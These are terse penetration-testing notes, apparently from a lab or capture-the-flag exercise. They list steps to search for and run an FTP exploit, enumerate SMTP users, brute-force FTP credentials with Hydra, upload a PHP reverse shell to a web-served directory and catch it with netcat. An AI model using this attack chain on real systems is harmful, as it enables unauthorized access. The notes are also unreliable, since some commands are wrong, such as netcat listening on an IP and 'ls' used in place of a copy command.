* `searchsploit ftpd`
* `searchsploit -m [exploit number].py`
* `vim [exploit number].py`
* `chmod +x [exploit number].py`
* `python3 [exploit number.py] [Target IP]`
* In msfconsole
* `use auxiliary/scanner/smtp/smtp_enum` --> Will give user accounts
* If these don't work, use brute-force attack using Hydra with ftp protocol.
* `ftp [target]` --> Use the credentials from the last step
* We can see that therre is a webs server associated with the target. So we will generate a payload to run it on the target system.
* We have different shells on the linux system for which the payloads can be generated.
* `ls -al /usr/share/webshells`
* Copy the required shell to the current working directory
* `ls -al /usr/share/webshells/php/php-reverse-shell.php .`
* Rename it to an easier readable name
* `mv php-reverse-shell.php shell.php`
* `vim shell.php`
* Modify $ip and $port
* `:wq`
* `ftp [target]`
* No we will get access to the "dav" directory using the "service" account.
* Upload the generated shell to the dav directory to be executed through the web server.
* This will be listened by Netcat listener on the attacker machine:
  * `nc -nvlp [Target IP]`
